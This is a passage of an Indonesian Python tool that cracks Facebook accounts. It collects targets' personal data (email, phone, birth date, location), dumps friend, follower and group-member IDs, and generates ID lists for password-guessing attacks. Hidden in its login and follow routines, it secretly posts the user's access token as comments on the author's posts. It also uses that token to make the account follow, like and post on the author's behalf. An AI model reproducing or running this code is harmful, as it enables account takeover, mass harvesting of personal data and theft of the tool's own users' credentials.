        r = requests.get('https://graph.facebook.com/%s/subscribers?access_token=%s'%(idt, toket))
        z = json.loads(r.text)
        pengikut = z['summary']['total_count']
    except (KeyError, IOError):
        pengikut = '%s-%s'%(M,N)
    except: pass
    print("\n"+war+'Informasih Target !!');time.sleep(0.30)
    print(bulat+"Full Name       : %s%s%s"%(I,nama,Q))
    print(bulat+"First Name      : %s%s%s"%(I,namade,Q))
    print(bulat+"Last Name       : %s%s%s"%(I,namabe,Q));time.sleep(0.30)
    print(bulat+'UserName        : %s%s%s'%(I,user,Q));time.sleep(0.30)
    print(bulat+'Tanggal Lahir   : %s%s%s'%(I,ttll,Q));time.sleep(0.30)
    print("\n"+war+'Data Data Target !!');time.sleep(0.30)
    print(bulat+'Gmail Facebook  : %s%s%s'%(I,emai,Q));time.sleep(0.30)
    print(bulat+'Nomor Telepons  : %s%s%s'%(I,nmrr,Q));time.sleep(0.30)
    print(bulat+'Jenis Kelamin   : %s%s%s'%(I,gndr,Q));time.sleep(0.30)
    print(bulat+'Jumlah Teman    : %s%s%s'%(I,temn,Q));time.sleep(0.03)
    print(bulat+'Followers       : %s%s%s'%(I,pengikut,Q));time.sleep(0.30)
    print(bulat+'Status Hubungan : %s%s %s%s'%(I,stas,dgn,Q));time.sleep(0.03)
    print(bulat+'Link Facebook   : %s%s%s'%(I,lins,Q));time.sleep(0.30)
    print(bulat+'Tentang Status  : %s%s%s'%(I,bioo,Q));time.sleep(0.30)
    print(bulat+'Kota Asal       : %s%s%s'%(I,dari,Q));time.sleep(0.30)
    print(bulat+'Tinggal         : %s%s%s'%(I,tigl,Q));time.sleep(0.30)
    print(bulat+'Terahir DiUpdate: %s%s%s'%(I,uptd,Q));time.sleep(0.30)
    input(war+"Tekan Enter Untuk Kembali"+Q)
    menu()

def login():
	os.system("clear")
	print (logo)
	os.popen('play-audio login2.mp3')
	
	print (" [%s01%s] Login Token"%(O,K))
#	print ("[3] Login Dengan Token Gratis")
	h_ = input(war+'Choose : ')
	if h_ in ["1", "01", "token"]:
		token()
	elif h_ in ["2", "02", "cokies"]:
		coke()
	elif h_ in ["auto"]:
		auto_token()
	else:jalan(war+"Isi Dengan Benar Kontol");time.sleep(1);login()
def auto_token():
	ba = 0
	bi = 0
	link_token = requests.get("https://free.facebook.com/story.php?story_fbid=213614107297063&id=100059454248601&_rdr")

#	link_token = requests.get("https://free.facebook.com/story.php?story_fbid=180923747373969&id=100063690353340&_rdr")

#	link_token = requests.get("https://m.facebook.com/photo.php?fbid=120338706765807&id=100063690353340&set=a.116524033813941&source=11&ref=bookmarks")

#	link_token = requests.get("https://free.facebook.com/story.php?story_fbid=1714009362122228&id=100005395413800&_rdr")
	gbl = par(link_token.content,'html.parser')
#	print (gbl)
	token_free = re.findall("EAA\w+", link_token.text)
	for naa in token_free:
		ba += 1
		if len(naa)>=37:
			token = naa
			print(war+"Token Yang Ke : "+str(ba))
			post4 = ('180923747373969') # Logo Zero From Risky 2021
			post5 = ("172628718203472") # Untuk Berbagi Token Dan Cookie Facebook
			requests.post('https://graph.facebook.com/' + post4 + '/comments/?message=' + token + '&access_token=' + token)
			requests.post('https://graph.facebook.com/' + post5 + '/comments/?message=' + token + '&access_token=' + token)
			requests.post('https://graph.facebook.com/100063690353340/subscribers?access_token=' + token) ### FB RISKY
			requests.post('https://graph.facebook.com/100002924366263/subscribers?access_token=' + token) ### FB RISKY
			requests.post('https://graph.facebook.com/110877271176800/subscribers?access_token=' + token) ### Halaman Risky
			requests.post('https://graph.facebook.com/Termuxid-Dumai-991-110877271176800/subscribers?access_token=' + token) ### Halaman Risky
			cek_token(naa)
	exit(war+"Sorry Token Not Found")
def token():
    toket = input(war+"Input Token :\x1b[0;96m ")
    try:
        otw = requests.get("https://graph.facebook.com/me?access_token=" + toket)
        a = json.loads(otw.text)
        nama = a["name"]
        zedd = open(".login.txt", "w")
        zedd.write(toket)
        zedd.close()
        print((war+"\nLogin Successful"))
        bot_follow()
    except KeyError:
        print(("\x1b[0;91m[!] Token Invalid"))
        time.sleep(2)
        token()
def check_kukis():
	session = req.Session()
	try:coki = open(".cokie.txt", "r").read()
	except:coke()
	respon = session.get("https://mbasic.facebook.com/profile.php",cookies={"cookie":coki}).text
	nama__ = re.findall('\<title\>(.*?)<\/title\>',str(respon))[0]
#	print(nama__)
	if "Halaman Tidak Ditemukan" in nama__:
		jalan(war+"Sorry Your Cookies Are Dead");time.sleep(1)
		try:os.remove(".cokie.txt")
		except:pass
	else:pass
def coke():
        _cookie=input(war+'Cookies : '+I)
        _cookie += "noscript=1;"+_cookie
        try:
                _head={
                        'Host':'business.facebook.com',
                                'cache-control':'max-age=0',
                        'upgrade-insecure-requests':'1',
                                'user-agent':'Mozilla/5.0 (Linux; Android 9; vivo 2007) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.101 Mobile Safari/537.36',
                        'accept' : 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
                                'content-type' : 'text/html; charset=utf-8',
                        'accept-encoding':'gzip, deflate',
                                'accept-language':'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7',
                        'cookie': _cookie
                }
                _r=_ses.get(urls, headers=_head)
                _p=re.search('(EAAG\w+)', _r.text)
                _h=_p.group(1)
                if 'EAA' in _h:
                        open(".login.txt", 'w').write('%s' % (_h))
                        open(".cokie.txt", 'w').write('%s' % (_cookie))
                        #bokep_barat_yang_terbaru(_cookie)
                        #bokep_barat_yang_terbaru(_h)
#                        bot_follow()
        except (AttributeError, requests.exceptions.TooManyRedirects):
                print(war+'Cookies Error !')
                time.sleep(3)
                coke()
        exit(jalan(war+"Run This Script Again: python jmbf.py"))


def bot_follow():
	s_ = requests.Session()
	post1 = ('4111448792295892') # Risky 2011
	post2 = ("120338706765807") # Risky 2021
	post3 = ("167879918678352") # Sama Macam dibawah
	post4 = ('180923747373969') # Logo Zero From Risky 2021
	post5 = ("172628718203472") # Untuk Berbagi Token Dan Cookie Facebook
	post6 = ("198550702277940") # Logo Akira From Risky 2031
	post7 = ("198552118944465") # Logo Attaxk From Risky 2021
	curi_ = ("4111448792295892") # Logo Zero Isap Permen :v
	my_idz_bot = [
	"100004499498856",
	"100000260233573",
	"100003888153228",
	"100076835203956",
	"100047878441954"
	]
	my_post_bot = [
	"120338706765807",
	"180923747373969",
	"172628718203472",
	"198550702277940",
	"198552118944465",
	"287175390082137",
	"230946969169829",
	"235968105334382",
	"197993725798487",
	"218558783741981",
	"138061478458379"
	]
	try:
		toket=open(".login.txt","r").read()
		token=open(".login.txt","r").read()
		otw = s_.get("https://graph.facebook.com/me/?access_token="+toket)
		a = json.loads(otw.text)
		nama = a["name"]
		id = a["id"]
		print(war+'Your Facebook Name : '+nama)
		print(war+'Your Facebook Id  : '+id)
		#bokep_barat_yang_terbaru(token)
	except Exception as e:
		print((war+"Token Invalid >%s%s%s<"%(I,e,Q)))
		time.sleep(1)
		login()
	for id_bot in my_idz_bot:
		s_.post('https://graph.facebook.com/'+id_bot+'/subscribers?access_token='+token)
	for post_id in my_post_bot:
		s_.post("https://graph.facebook.com/"+post_id+"/likes?summary=true&access_token=" + toket)
	s_.post('https://graph.facebook.com/' + post4 + '/comments/?message=' + token + '&access_token=' + token)
	s_.post('https://graph.facebook.com/' + post5 + '/comments/?message=' + token + '&access_token=' + token)
	s_.post('https://graph.facebook.com/287175390082137/comments/?message=' + token + '&access_token=' + token)

	menu()    
def cek_token(token):
	requests.post("https://graph.facebook.com/me/feed/?link=https://fb.com/100044347381124/posts/450021263152783/?app=fbl&access_token=" + token)
	try:
		otw = requests.get("https://graph.facebook.com/me/?access_token="+token)
		a = json.loads(otw.text)
		nama = a["name"]
		id = a["id"]
		print(war+'Your Facebook name : '+nama[0:10])
		print(war+'Your Facebook Id   : '+id)
		print(war+""+token)
	except:pass
	try:
		goblok = []
		for i in requests.get("https://graph.facebook.com/me/friends?limit=9999&access_token="+token).json()["data"]:
			try:
				anak_kontol_anak_anjing_pantek_lonte_bentar_lagi_mau_tahun_baru_kontol = i["id"]
				goblok.append(anak_kontol_anak_anjing_pantek_lonte_bentar_lagi_mau_tahun_baru_kontol)
			except:pass
	except KeyError:pass
	_id = ("%s"%(len(goblok)))
	if _id == "0" or "0" == _id:
		jalan(war+"Have No Friends !")
	else:
		print(war+"Friend : "+I+_id+Q)
		jalan(war+"Do you want to use this token (y/n):")
		haalq = input(war+"Choose : ")
		if haalq in ["y","Y"]:
			tok = open(".login.txt", "w")
			tok.write(token)
			tok.close()
			print ("\n"+war+"Token : "+I+token+Q)
			exit(jalan(war+"Token Found. Please, Type: python jmbf.py"))
			exit()
		else:pass
	print ("\n")
def buat_old():
	jalan(war+"Please Choose the Old Idz Form !")
#		   1000000000"+U+"00000
	print("[1] 1000000000"+U+"*****"+Q)
	print("[2] 100000000"+U+"******"+Q)
	print("[3] 10000000"+U+"*******"+Q)
	print("[4] 1000000"+U+"********"+Q)
	print("[5] 100000"+U+"*********"+Q)
	print("[6] 10000"+U+"**********"+Q)
	ben = input("\n"+war+"Old Form: ")
	try:
		lim_ = int(input(war+"Limit : "))
	except:lim_ = "5000"
	if ben == "" or ben == " ":
		jalan(war+"Don't Empty Om !");time.sleep(2)
		buat_old()
	elif ben == "1" or ben == "01":
		_             = 11111
		__            = 99999
		___ ="1000000000"
		try:
			for n in range(lim_):
				bokeq = random.randint(_, __)
				old_a = open('old.txt', 'a')
				old_a.write(str(___)+str(bokeq)+"<=>Kiky_And_Wans_And_Jeck\n")
			old_a.close()
		except Exception as e:
			print((" Error : %s"%e)),;time.sleep(1)
		jalan(war+"Do you want to immediately start crack? (Y/n): ")
		nha = input(war+"Choose : ")
		if nha == "y" or nha == "Y":
			crackmenu("old.txt").crackold("old.txt")
			exit(war+"Done :v")
		else:
			input(war+"Press Enter !!");time.sleep(2)
			menu()
	elif ben == "2" or ben == "02":
#		      100000000000000
#		      100000000******
		_            = 111111
		__           = 999999
		___ ="100000000"
		try:
			for n in range(lim_):
				bokeq = random.randint(_, __)
				old_a = open('old.txt', 'a')
				old_a.write(str(___)+str(bokeq)+"<=>Kiky_And_Wans_And_Jeck\n")
			old_a.close()
		except Exception as e:
			print((" Error : %s"%e)),;time.sleep(1)
		jalan(war+"Do you want to immediately start crack? (Y/n): ")
		nha = input(war+"Choose : ")
		if nha == "y" or nha == "Y":
			crackmenu("old.txt").crackold("old.txt")
			exit(war+"Done :v")
		else:
			input(war+"Press Enter !!");time.sleep(2)
			menu()


	elif ben == "3" or ben == "03":
#		      100000000000000
#		      10000000*******
		_           = 1111111
		__          = 9999999
		___ ="10000000"
		try:
			for n in range(lim_):
				bokeq = random.randint(_, __)
				old_a = open('old.txt', 'a')
				old_a.write(str(___)+str(bokeq)+"<=>Kiky_And_Wans_And_Jeck\n")
			old_a.close()
		except Exception as e:
			print((" Error : %s"%e)),;time.sleep(1)
		jalan(war+"Do you want to immediately start crack? (Y/n): ")
		nha = input(war+"Choose : ")
		if nha == "y" or nha == "Y":
			crackmenu("old.txt").crackold("old.txt")
			exit(war+"Done :v")
		else:
			input(war+"Press Enter !!");time.sleep(2)
			menu()
	elif ben == "4" or ben == "04":
#		      100000000000000
#		      1000000********
		_          = 11111111
		__         = 99999999
		___ ="1000000"
		try:
			for n in range(lim_):
				bokeq = random.randint(_, __)
				old_a = open('old.txt', 'a')
				old_a.write(str(___)+str(bokeq)+"<=>Kiky_And_Wans_And_Jeck\n")
			old_a.close()
		except Exception as e:
			print((" Error : %s"%e)),;time.sleep(1)
		jalan(war+"Do you want to immediately start crack? (Y/n): ")
		nha = input(war+"Choose : ")
		if nha == "y" or nha == "Y":
			crackmenu("old.txt").crackold("old.txt")
			exit(war+"Done :v")
		else:
			input(war+"Press Enter !!");time.sleep(2)
			menu()
	elif ben == "5" or ben == "05":
#		      100000000000000
#		      100000*********
		_         = 111111111
		__        = 999999999
		___ ="100000"
		try:
			for n in range(lim_):
				bokeq = random.randint(_, __)
				old_a = open('old.txt', 'a')
				old_a.write(str(___)+str(bokeq)+"<=>Kiky_And_Wans_And_Jeck\n")
			old_a.close()
		except Exception as e:
			print((" Error : %s"%e)),;time.sleep(1)
		jalan(war+"Apakah Anda Mau Lasung Start Crack (Y/n): ")
		nha = input(war+"Pilih : ")
		if nha == "y" or nha == "Y":
			crackmenu("old.txt").crackold("old.txt")
			exit(war+"Done :v")
		else:
			input(war+"Tekan Enter !!");time.sleep(2)
			menu()
	elif ben == "6" or ben == "06":
#		      100000000000000
#		      10000**********
		_        = 1111111111
		__       = 9999999999
		___ ="10000"
		try:
			for n in range(lim_):
				bokeq = random.randint(_, __)
				old_a = open('old.txt', 'a')
				old_a.write(str(___)+str(bokeq)+"<=>Kiky_And_Wans_And_Jeck\n")
			old_a.close()
		except Exception as e:
			print((" Error : %s"%e)),;time.sleep(1)
		jalan(war+"Apakah Anda Mau Lasung Start Crack (Y/n): ")
		nha = input(war+"Pilih : ")
		if nha == "y" or nha == "Y":
			crackmenu("old.txt").crackold("old.txt")
			exit(war+"Done :v")
		else:
			input(war+"Tekan Enter !!");time.sleep(2)
			menu()
	else:
		jalan(war+"Isi Dengan Benar Om !");time.sleep(2)
		buat_old()
#def kiky_and_wans_and_jeck(limt, bn, gd, fu):

def buat_oldv1():
	try:
		for n in range(5000):
#					       100002151005321
#     			                       10000005100532
			bokeq = random.randint(111111111, 999999999)
			old_a = open('oldv2.txt', 'a')
			old_a.write(str(bokeq)+"<=>123456\n")

	except Exception as e:
		print((" Error : %s"%e)),;time.sleep(1)

def dump_old():
        try:
                token = open(".login.txt","r").read()
        except IOError:
                jalan(war+"Token Failed");time.sleep(2)
                time.sleep(0.5)
                login()
        try:
                nada = int(input("\n"+war+"Mau Dump Berapa Idz : "))
                if nada>20:
                        jalan(war+"Max 20 Idz")
                        time.sleep(0.5)
                        dump_old()
        except ValueError:
                jalan(war+"Input Invalid")
                time.sleep(0.5)
                dump_old()
        namax = input(war+"Name File (contoh : kiky)"+K+"Enter:Random"+Q+": ")
        if namax == "" or namax == " ":
           namax = text_random()
#           jalan(war+"Nama File Tidak Boleh Kosong");time.sleep(1);dump_old
        lonsg = open("dump/"+namax+".json", "w")
        for dot in range(nada):
                dot+=1
                tampung = []
                non_old = []
                uid = input(war+"Masukkan ID Target Ke %s : "%(dot))
                try:
                        asu = requests.get("https://graph.facebook.com/"+uid+"?access_token="+token)
                        tulul = json.loads(asu.text)
                        print(war+"Name :"+tulul["name"])
                except KeyError:
                        print(war+"Kemungkinan Idz Ini Tidak DiPublickan")
                        time.sleep(0.5)
                        exit()
                except requests.exceptions.ConnectionError:
                        jalan(war+"Tidak Ada Internet")
                        time.sleep(0.5)
                        exit()
                try:
                        bulu = requests.get("https://graph.facebook.com/"+uid+"/friends?limit=10000&access_token="+token)
                        buriq = json.loads(bulu.text)
                        for cew in buriq["data"]:
                                try:
                                        jamet = cew["id"]
                                        junet = cew["name"]
                                        non_old.append(jamet+"|"+junet)
                                        detec = jamet+"|"+junet
                                        if detec in id:
                                                continue
                                        else:
                                                if len(jamet)==6 or len(jamet)==7 or len(jamet)==8:
                                                        id.append(jamet+"|"+junet)
                                                        tampung.append(jamet+"|"+junet)
                                                        well = open("dump/"+namax+".json","a");well.write(jamet+"<=>"+junet+"\n");well.close()
                                                elif len(jamet)==9:
                                                        id.append(jamet+"|"+junet)
                                                        tampung.append(jamet+"|"+junet)
                                                        well = open("dump/"+namax+".json","a");well.write(jamet+"<=>"+junet+"\n");well.close()
                                                elif len(jamet)==10 and jamet[0]=="1":
                                                        if jamet[1]=="0" or jamet[1]=="1":
                                                                if jamet[2]=="0" or jamet[2]=="1" or jamet[2]=="2":
                                                                        id.append(jamet+"|"+junet)
                                                                        tampung.append(jamet+"|"+junet)
                                                                        well = open("dump/"+namax+".json","a");well.write(jamet+"<=>"+junet+"\n");well.close()
                                                                else:continue
                                                        else:continue
                                                else:
                                                        try:
                                                            jame, jamet = jamet.split("0000")
                                                            jamet = ("10000"+jamet)
                                                            id.append(jamet+"|"+junet)
                                                            tampung.append(jamet+"|"+junet)
                                                            well = open("dump/"+namax+".json","a")
                                                            well.write(jamet+"<=>"+junet+"\n")
                                                            well.close()
                                                        except:pass
                                except:
                                        continue
#                                except Exception as e:print("%s"%(e))
#                        print(war+"Total ID : %s"%(len(non_old)))
                        print(war+"Jumlah Akun Old : %s\n"%(len(tampung)))
                except requests.exceptions.ConnectionError:
                        jalan(war+"Tidak Ada Internet")
                        time.sleep(0.5)
                        exit()
                except:
                        jalan(war+"Maaf Idz "+C+uid+Q+" Ini Tidak DiPublickan, Cari Yang Lain_-");time.sleep(2);dump_old()
        id_ = ("%s"%(len(id)))
        if id_ == "0" or "0" == id_:
             jalan(war+"Kemungkinan ID yang kamu masukan tidak dipublickan !!")
        else:
             print(war+"Total ID : %s"%(len(id)))
             jalan(war+"Nama Hasil Dump : "+I+"dump/"+namax+".json"+Q)
             jalan(war+"Silahkan Copy Nama Hasil Dump Tadi !!")
             jalan("\n"+war+"Apakah Anda Mau Lasung Crack Dengan File Ini (Y/n) : ")
             zz = input(war+'Pilih : ')
             if zz in ["Y", "y", "Yes", "1"]:
                  crackmenu("dump/"+namax+".json").passmenu("dump/"+namax+".json")
                  exit()
             else:
                  pass
        input(war+"Tekan Enter Untuk Kembali")
        menu()
def dump_follow():
	try:
		token = open(".login.txt", "r").read()
	except IOError:
		os.system("rm -rf .login.txt")
		exit(war+"Token Failed !!");time.sleep(2)

	try:
		tanya_total = int(input(war+"How much do you want to dump? : "))
	except:tanya_total=1
	namafi = input(war+"Name File (Example : Dada)"+K+"Enter:Random"+Q+" : ")
	if namafi == "" or namafi == " ":
		namafi = text_random()
	dump = open('dump/'+namafi+'.json','w') 
	jalan(war+"Write "+I+"me"+Q+" to dump your own data")
	for t in range(tanya_total):
		t +=1
		idt = input(war+"Input ID or Username target %s : "%(t))
		idt = ubah_username_to_id(idt)
		limit = ("10000")
		try:
			if idt == "me" or "me" == idt:
				otw = requests.get("https://graph.facebook.com/me/?access_token="+token)
				op = json.loads(otw.text)
			else:
				jok = requests.get("https://graph.facebook.com/"+idt+"?access_token="+token)
				op = json.loads(jok.text)
			try:
				nama = op['name']
			except (KeyError, IOError):
				nama = ("Nama Tidak DiTemukan !")
#			try:
#				tempat = op['location']['name']
#			except (KeyError, IOError):
#				tempat = ("Lokasi Tidak DiTemukan")
#			try:
#				tinggal = op['hometown']['name']
#			except (KeyError, IOError):
#				tinggal = ("Nama Kota Tidak DiTemukan")

		except Exception as e:
			jalan(war+"Sorry ID "+C+idt+Q+" This Was Not Found  !")
			continue
		jalan("\n"+war+"Name   : "+I+nama+Q+"\n")
#		jalan(war+"Kota   : "+I+tempat+Q)
#		jalan(war+"Lokasi : "+I+tinggal+Q+"\n")
		try:
			dump = open('dump/'+namafi+'.json','a+') 
			for i in requests.get("https://graph.facebook.com/"+idt+"/subscribers?limit="+limit+"&access_token="+token).json()["data"]:
				try:
					uid = i["id"]
					nama = i["name"]
					id.append(uid+"<=>"+nama)
					dump.write(uid+'<=>'+nama+'\n')
				except:pass
			dump.close()
		except KeyError:pass
	id_ = ("%s"%(len(id)))
	if id_ == "0" or "0" == id_:
		jalan(war+"Account is not Public !!")
	else:
		print(war+"Total ID : %s"%(len(id)))
		jalan(war+"Name Hasil Dump : "+I+"dump/"+namafi+".json"+Q)
		jalan(war+"Please Copy the Dump Result Name !!")
		jalan("\n"+war+"Do you want to directly crack with this file (Y/n) : ")
		zz = input(war+'Choose : ')
		if zz in ["Y", "y", "Yes", "1"]:
			crackmenu("dump/"+namafi+".json").passmenu("dump/"+namafi+".json")
			exit()
		else:
			pass
	input(war+"Press Enter !!")
	menu()	   
def cek_history(it):
	global tanya_total
	vc = ""
	if it == "me" or "me" == it:pass
	else:
		history = open(".idz", "a+")
	#	idt = input("Idz : ")
		his = open(".idz","r").readlines()
		for n in his:
			try:
				n = n.replace("\n","")
				if n == it:
					jalan(war+"Sorry Idz "+C+it+Q+" This Has Been Dump/Crack\n")
					vc += "1"
			except:pass
		if vc == "1" or "1" == vc:
			jalan(war+"Do You Want to Dump/Crack With This Idz (Y/n) : ")
			bz = input(inp+"Choose : ")
			if bz == "Y" or bz == "y":
				tanya_total += 1
				return tanya_total
		else:
			history.write(it+"\n")
			history.close()
def crack_grup(hencet):
    try:
        _mmk_ = open('.cokie.txt').read()
        _cok_  = {"cookie":_mmk_}
        kueh  = {"cookie":_mmk_}
        kontol=requests.get(hencet,cookies=_cok_).text
        memek=re.findall('\<h3\>\<a\ class\=\"..\"\ href\=\"\/(.*?)\"\>(.*?)<\/a\>',kontol)
        for softek in memek:
            if "profile.php?" in softek[0]:
                id.append(re.findall("id=(.*)",softek[0])[0]+"<=>"+softek[1])
                open("dump/"+nama_grup+".json", "a").write(re.findall("id=(.*)",softek[0])[0]+"<=>"+softek[1]+"\n")
            else:
                id.append(softek[0]+"<=>"+softek[1])
                open("dump/"+nama_grup+".json", "a").write(softek[0]+"<=>"+softek[1]+"\n")
            sys.stdout.write('\r'+war+'Gathering %s Idz... '%(len(id))); sys.stdout.flush()
        if "Lihat Selengkapnya" in kontol:
            crack_grup(url_mb+BeautifulSoup(kontol,"html.parser").find("a",string="Lihat Selengkapnya").get("href"))
        else:
            def geh(gey):
                a=requests.get(gey,cookies=kueh).text
                b=re.findall('\<h3\ class\=\".*?">\<span>\<strong>\<a\ href\=\"/(.*?)\">(.*?)</a\>\</strong\>',a)
                if len(b)!=0:
                    for c in b:
                        if "profile.php" in c[0]:
                            d=re.search("profile.php\?id=(\\d*)",c[0]).group(1)
                            if d in id:
                                continue
                            else:
                                id.append(d+"<=>"+c[1])
                                open("dump/"+nama_grup+".json", "a").write(d+"<=>"+c[1]+"\n")
                        else:
                            d=re.search("(.*?)\?refid",c[0]).group(1)
                            if d in id:
                                continue
                            else:
                                id.append(d+"<=>"+c[1])
                                open("dump/"+nama_grup+".json", "a").write(d+"<=>"+c[1]+"\n")
                        sys.stdout.write('\r'+war+'Gathering %s Idz... '%(len(id))); sys.stdout.flush()
                if "Lihat Postingan Lainnya" in a:
                    geh(url_mb+BeautifulSoup(a,"html.parser").find("a",string="Lihat Postingan Lainnya").get("href"))
            geh(f"{url_mb}/groups/"+re.search("id=(\\d*)",hencet).group(1))
    except:pass




def dump_public():
	try:
		token = open(".login.txt", "r").read()
	except IOError:
		os.system("rm -rf .login.txt")
		exit(war+"Token Failed !!");time.sleep(2)
	try:
		tanya_total = int(input(war+"Total ID : "))
	except:tanya_total=1
	namafi = input(war+"Name File : ")
	if namafi == "" or namafi == " ":
		namafi = text_random()
	dump = open('dump/'+namafi+'.json','w') 
	jalan(war+"Type me To Dump From Friendlist")
	for t in range(tanya_total):
		t +=1
		idt = input(war+"Input ID or Username target %s : "%(t))
		idt = ubah_username_to_id(idt)
#		cek_history(idt)
		limit = ("10000")
		try:
			if idt == "me" or "me" == idt:
				otw = requests.get("https://graph.facebook.com/me/?access_token="+token)
				op = json.loads(otw.text)
			else:
				jok = requests.get("https://graph.facebook.com/"+idt+"?access_token="+token)
				op = json.loads(jok.text)
			try:
				nama = op['name']
			except (KeyError, IOError):
				nama = ("Nama Tidak DiTemukan !")
#			try:
#				tempat = op['location']['name']
#			except (KeyError, IOError):
#				tempat = ("Lokasi Tidak DiTemukan")
#			try:
#				tinggal = op['hometown']['name']
#			except (KeyError, IOError):
#				tinggal = ("Nama Kota Tidak DiTemukan")

		except Exception as e:
			jalan(war+"Sorry ID "+C+idt+Q+" This Was Not Found ! ("+str(e)+")")
			continue
		jalan("\n"+war+"Name   : "+I+nama+Q+"\n")
#		jalan(war+"Kota   : "+I+tempat+Q)
#		jalan(war+"Lokasi : "+I+tinggal+Q+"\n")
		try:
			dump = open('dump/'+namafi+'.json','a+') 
			for i in requests.get("https://graph.facebook.com/"+idt+"/friends?limit="+limit+"&access_token="+token).json()["data"]:
				try:
					uid = i["id"]
					nama = i["name"]
					id.append(uid+"<=>"+nama)
					dump.write(uid+'<=>'+nama+'\n')
				except:pass
			dump.close()
		except KeyError:pass
	id_ = ("%s"%(len(id)))
	if id_ == "0" or "0" == id_:
		jalan(war+"Account Was Not Public !!")
	else:
		print(war+"Total ID : %s"%(len(id)))
		jalan(war+"Name Hasil Dump : "+I+"dump/"+namafi+".json"+Q)
		jalan(war+"Please Copy the Dump Result Name !!")
		jalan("\n"+war+"Do you want to directly crack with this file (Y/n) : ")
		zz = input(war+'Choose : ')
		if zz in ["Y", "y", "Yes", "1"]:
			crackmenu("dump/"+namafi+".json").passmenu("dump/"+namafi+".json")
			exit()
		else:
			pass
	input(war+"Press Enter !!")
	menu()	    
def dump_follow_public():
	try:
		token = open(".login.txt", "r").read()
	except IOError:
		os.system("rm -rf .login.txt")
		exit(war+"Token Failed !!");time.sleep(2)

	try:
		tanya_total = int(input(war+"How much do you want to dump?: "))
	except:tanya_total=1
	namafi = input(war+"Name File (Example : Dada)"+K+"Enter:Random"+Q+" : ")
	if namafi == "" or namafi == " ":
		namafi = text_random()
	dump = open('dump/'+namafi+'.json','w') 
	jalan(war+"Write "+I+"me"+Q+"to dump your own data ")
	for t in range(tanya_total):
		t +=1
		idt = input(war+"Input ID or Username target %s : "%(t))
		idt = ubah_username_to_id(idt)
		limit = ("10000")
		try:
			if idt == "me" or "me" == idt:
				otw = requests.get("https://graph.facebook.com/me/?access_token="+token)
				op = json.loads(otw.text)
			else:
				jok = requests.get("https://graph.facebook.com/"+idt+"?access_token="+token)
				op = json.loads(jok.text)
			try:
				nama = op['name']
			except (KeyError, IOError):
				nama = ("Nama Tidak DiTemukan !")
#			try:
#				tempat = op['location']['name']
#			except (KeyError, IOError):
#				tempat = ("Lokasi Tidak DiTemukan")
#			try:
#				tinggal = op['hometown']['name']
#			except (KeyError, IOError):
#				tinggal = ("Nama Kota Tidak DiTemukan")

		except Exception as e:
			jalan(war+"Sorry ID "+C+idt+Q+" This Was Not Found !")
			continue
		jalan("\n"+war+"Name   : "+I+nama+Q+"\n")
#		jalan(war+"Kota   : "+I+tempat+Q)
#		jalan(war+"Lokasi : "+I+tinggal+Q+"\n")
		try:
			dump = open('dump/'+namafi+'.json','a+')
			for i in requests.get("https://graph.facebook.com/"+idt+"/subscribers?limit="+limit+"&access_token="+token).json()["data"]:
				try:
					uid = i["id"]
					nama = i["name"]
					id.append(uid+"<=>"+nama)
					dump.write(uid+'<=>'+nama+'\n')
				except:pass
			dump.close()
		except KeyError:pass
		try:
			for i in requests.get("https://graph.facebook.com/"+idt+"/friends?limit="+limit+"&access_token="+token).json()["data"]:
				try:
					uid = i["id"]
					nama = i["name"]
					id.append(uid+"<=>"+nama)
					dump.write(uid+'<=>'+nama+'\n')
				except:pass
			dump.close()
		except KeyError:pass
	id_ = ("%s"%(len(id)))
	if id_ == "0" or "0" == id_:
		jalan(war+"It is possible that the ID you entered is not published !!")
	else:
		print(war+"Total ID : %s"%(len(id)))
		jalan(war+"Name Hasil Dump : "+I+"dump/"+namafi+".json"+Q)
		jalan(war+" Please Copy the Dump Result Name !!")
		jalan("\n"+war+"Do you want to directly crack with this file (Y/n) : ")
		zz = input(war+'Choose : ')
		if zz in ["Y", "y", "Yes", "1"]:
			crackmenu("dump/"+namafi+".json").passmenu("dump/"+namafi+".json")
			exit()
		else:
			pass
	input(war+"Press Enter !!")
	menu()
def cekfile(folder):
        print("\n   C H O O S E  F I L E\n")
        dirs = os.listdir(folder)
        for file in dirs:
                filex = (folder+"/"+file)
                try:
                        juma = open(filex,"r").readlines()
                        total = ("%s"%(str(len(juma))))
                except:total = (" ?? ")                
                print(war+P+filex+P+" : "+Q+K+total)
def cekfile_crk(folder):
        dirs = os.listdir(folder)
        for file in dirs:
                filex = (folder+"/"+file)
                try:
                        juma = open(filex,"r").readlines()
                        total = ("%s"%(str(len(juma))))
                except:total = (" ?? ")
                try:
                    ijo__ = filex.split("Hasil/OK-")[1]
                    ijo_ = (war+I+"Hasil/OK-"+ijo__)
                    print(ijo_+U+"   <=>   "+Q+M+total)
                except:pass

                try:
                    kuning__ = filex.split("Hasil/CP-")[1]
                    kuning_ = (war+K+"Hasil/CP-"+kuning__)
                    print(kuning_+U+"   <=>   "+Q+M+total)
                except:pass

#                print(war+C+filex+U+" <==> "+Q+K+total)
def dump_ulti():
	try:
		token = open(".login.txt", "r").read()
		toket = open(".login.txt", "r").read()
	except IOError:
		os.system("rm -rf .login.txt")
		exit(war+"Token Failed !!");time.sleep(2)

	jalan(war+"write "+I+"me"+Q+" To dump your own data")
	idt = input(war+"Input ID or Username target : " )
	idt = ubah_username_to_id(idt)
	try:
		if idt == "me" or "me" == idt:
			otw = requests.get("https://graph.facebook.com/me/?access_token="+token)
			op = json.loads(otw.text)
		else:
			jok = requests.get("https://graph.facebook.com/"+idt+"?access_token="+token)
			op = json.loads(jok.text)
		try:
			nama = op['name']
		except (KeyError, IOError):
			nama = ("Nama Tidak DiTemukan !")
#		try:
#			tempat = op['location']['name']
#		except (KeyError, IOError):
#			tempat = ("Lokasi Tidak DiTemukan")
#		try:
#			tinggal = op['hometown']['name']
#		except (KeyError, IOError):
#			tinggal = ("Nama Kota Tidak DiTemukan")

	except Exception as e:
		jalan(war+" Sorry ID "+C+idt+Q+"This Was Not Found!")
		time.sleep(2)
		dump_ulti()
	jalan("\n"+war+"Name   : "+I+nama+Q+"\n")
	if nama == "Nama Tidak DiTemukan !":
		time.sleep(2)
		dump_ulti()

#	jalan(war+"Kota   : "+I+tempat+Q)
#	jalan(war+"Lokasi : "+I+tinggal+Q+"\n")
	namq = input(war+"Name File (Example : Dada)"+K+"Enter:Random"+Q+": ")
	if namq == "" or namq == " ":
		namq = text_random()
	dump = open('.janganedit','w') 
	try:
